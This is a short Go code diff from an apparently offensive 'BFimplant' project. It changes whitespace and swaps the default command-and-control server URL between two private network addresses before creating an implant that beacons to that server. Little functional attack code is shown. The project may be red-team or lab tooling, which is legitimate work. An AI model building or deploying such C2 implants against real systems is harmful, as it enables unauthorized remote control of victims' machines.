@@ -6,10 +6,8 @@ import (
 	"BFimplant/mymutex"
 	"BFimplant/modules"
 	"syscall"
-
+	
 )
-
-
 
 
 func main() {
@@ -30,7 +28,7 @@ func main() {
 		//run the 
 		c2ServerURL := os.Getenv("C2_URL")
 		if c2ServerURL == "" {
-			c2ServerURL = "http://192.168.1.247:5000"
+			c2ServerURL = "http://192.168.0.108:5000"
 		}
 		defer mymutex.ReleaseMutex(mutex)
 		implant := NewImplant(c2ServerURL)
